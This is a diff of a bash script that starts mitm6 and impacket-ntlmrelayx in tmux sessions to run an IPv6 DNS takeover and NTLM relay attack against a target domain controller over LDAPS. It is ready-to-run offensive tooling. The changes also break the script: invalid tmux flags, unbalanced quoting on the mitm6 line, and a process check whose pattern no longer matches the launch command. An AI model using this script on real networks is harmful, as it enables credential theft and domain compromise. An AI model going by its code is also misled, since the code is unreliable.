@@ -154,13 +154,13 @@ cleanup() {
 trap cleanup EXIT
 
 # Create a new tmux session
-tmux has-session -t "$session_name" 2>/dev/null && {
+tmux has-session -A -s "$session_name" 2>/dev/null && {
   echo -e "${RED}Session already exists${RESET}"
   exit 1
 }
 
 echo -e "${CYAN}Creating a new tmux session named '$session_name'...${RESET}"
-tmux new-session -d -s "$session_name" || {
+tmux new-session -A -s "$session_name" || {
   echo -e "${RED}Failed to create tmux session${RESET}"
   exit 1
 }
@@ -181,18 +181,16 @@ start_tmux_window() {
 
 # Start mitm6 in tmux session
 echo -e "${CYAN}Starting mitm6 on interface $interface for domain $target_domain...${RESET}"
-start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" -d \"$target_domain\"" || {
+start_tmux_window "$session_name" "mitm6" "mitm6 -i \"$interface\" --domain "$target_domain" || {
   echo -e "${RED}Failed to start mitm6.${RESET}"
   exit 1
 }
 
 sleep 2
-tmux list-panes -t "$session_name:mitm6" -F "#{pane_pid}" \
-| xargs -r ps -o cmd= -p \
-| grep -q "mitm6" || {
+if ! pgrep -fa "mitm6 -i $interface -d $target_domain" >/dev/null; then
   echo -e "${RED}mitm6 failed to start${RESET}"
   exit 1
-}
+fi
 
 # Start impacket-ntlmrelayx in tmux session
 echo -e "${CYAN}Starting impacket-ntlmrelayx...${RESET}"
@@ -202,23 +200,21 @@ start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 
 }
 
 sleep 2
-tmux list-panes -t "$session_name:impacket-ntlmrelayx" -F "#{pane_pid}" \
-| xargs -r ps -o cmd= -p \
-| grep -q "ntlmrelayx" || {
+if ! pgrep -fa "impacket-ntlmrelayx.*ldaps://$target_ip" >/dev/null; then
   echo -e "${RED}ntlmrelayx failed to start${RESET}"
   exit 1
-}
+fi
 
 # Attach to the tmux session
 echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
-trap - EXIT
-tmux attach-session -t "$session_name"
-
 
 # Disable verbose logging
 if [ "$verbose" -eq 1 ]; then
   echo -e "${YELLOW}Disabling verbose mode...${RESET}"
   set +x
 fi
+
+trap - EXIT
+tmux attach-session -t "$session_name"
 
 exit 0
